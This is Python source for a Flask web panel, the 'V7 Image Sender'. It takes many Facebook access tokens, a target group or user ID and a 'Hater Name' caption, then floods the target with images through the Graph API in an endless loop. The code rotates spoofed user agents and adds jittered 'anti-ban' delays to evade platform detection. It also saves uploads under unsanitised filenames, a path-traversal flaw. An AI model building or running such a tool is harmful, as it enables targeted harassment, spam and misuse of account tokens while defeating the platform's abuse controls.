from flask import Flask, request, render_template_string, jsonify
import requests
import random
import string
import time
import os
from threading import Thread, Event

app = Flask(__name__)

# Task storage
tasks = {}

# ==========================================
# CORE IMAGE SENDER LOGIC
# ==========================================
def send_images_task(task_id, access_tokens, thread_id, image_paths, speed, hater_name):
    task = tasks.get(task_id)
    if not task: return

    user_agents = [
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1'
    ]

    while not task['stop_event'].is_set():
        for img_path in image_paths:
            if task['stop_event'].is_set(): break
            
            for token in access_tokens:
                if task['stop_event'].is_set(): break
                
                # API Endpoint for sending media
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/photos"
                
                payload = {
                    'access_token': token,
                    'caption': hater_name # Image ke sath text message
                }
                
                headers = {'User-Agent': random.choice(user_agents)}
                
                try:
                    with open(img_path, 'rb') as img_file:
                        files = {'file': img_file}
                        response = requests.post(url, data=payload, files=files, headers=headers)
                        
                    if response.status_code == 200:
                        print(f"[{task_id}] Image Sent Successfully with token {token[:10]}...")
                    else:
                        print(f"[{task_id}] Failed: {response.text}")
                except Exception as e:
                    print(f"[{task_id}] Error: {e}")
                
                # Anti-ban delay
                jitter = random.uniform(1.0, 3.0)
                time.sleep(speed + jitter)

# ==========================================
# UI & ROUTES
# ==========================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANURAG MISHRA - IMAGE SENDER</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background: #0f172a; color: #f1f5f9; font-family: 'Poppins', sans-serif; padding: 20px; }
        .main-card {
            max-width: 500px; margin: 0 auto; background: rgba(30, 41, 59, 0.9);
            padding: 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
        }
        h1 { text-align: center; font-weight: 800; background: linear-gradient(90deg, #00d2ff, #3a7bd5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .form-control { background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 10px; margin-bottom: 15px; }
        .btn-gradient { background: linear-gradient(90deg, #3a7bd5, #00d2ff); border: none; color: #fff; font-weight: 700; width: 100%; padding: 12px; border-radius: 10px; }
        .stop-box { margin-top: 20px; padding-top: 20px; border-top: 1px solid #334155; }
    </style>
</head>
<body>
    <div class="main-card">
        <h1>ANURAG MISHRA</h1>
        <p class="text-center text-secondary">V7 Image Sender Panel</p>
        
        <form id="imageForm" enctype="multipart/form-data">
            <label>Access Tokens (one per line)</label>
            <textarea class="form-control" name="tokens" rows="3" placeholder="EAADV..." required></textarea>

            <label>Target ID (Group/UID)</label>
            <input type="text" class="form-control" name="thread_id" placeholder="e.g. 100045..." required>

            <label>Hater Name / Caption</label>
            <input type="text" class="form-control" name="hater_name" placeholder="Caption with image">

            <label>Select Images</label>
            <input type="file" class="form-control" name="images" accept="image/*" multiple required>

            <label>Delay (Seconds)</label>
            <input type="number" class="form-control" name="speed" value="30">

            <button type="submit" id="startBtn" class="btn-gradient">START SENDING</button>
        </form>

        <div class="stop-box">
            <input type="text" id="stopId" class="form-control" placeholder="Enter Task ID to Stop">
            <button onclick="stopTask()" class="btn btn-danger w-100" style="border-radius:10px;">STOP TASK</button>
        </div>
        <div id="status" class="mt-3 text-center text-info"></div>
    </div>

    <script>
        document.getElementById('imageForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('startBtn');
            btn.disabled = true; btn.innerText = "Starting...";
            
            const res = await fetch('/start', { method: 'POST', body: new FormData(e.target) });
            const data = await res.json();
            
            if(data.success) {
                document.getElementById('status').innerHTML = "Task Started! ID: " + data.task_id;
            } else {
                alert("Error: " + data.message);
            }
            btn.disabled = false; btn.innerText = "START SENDING";
        };

        async function stopTask() {
            const id = document.getElementById('stopId').value;
            const res = await fetch('/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({task_id: id})
            });
            const data = await res.json();
            alert(data.message);
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start():
    try:
        tokens = request.form.get('tokens').splitlines()
        thread_id = request.form.get('thread_id')
        hater_name = request.form.get('hater_name')
        speed = float(request.form.get('speed', 30))
        
        # Save uploaded images
        uploaded_files = request.files.getlist('images')
        image_paths = []
        if not os.path.exists('uploads'): os.makedirs('uploads')
        
        for file in uploaded_files:
            path = os.path.join('uploads', file.filename)
            file.save(path)
            image_paths.append(path)

        task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        stop_event = Event()
        
        thread = Thread(target=send_images_task, args=(task_id, tokens, thread_id, image_paths, speed, hater_name))
        tasks[task_id] = {'stop_event': stop_event, 'thread': thread}
        thread.start()

        return jsonify({'success': True, 'task_id': task_id})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.get_json()
    task_id = data.get('task_id')
    if task_id in tasks:
        tasks[task_id]['stop_event'].set()
        return jsonify({'success': True, 'message': f'Task {task_id} stopped.'})
    return jsonify({'success': False, 'message': 'Invalid ID.'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
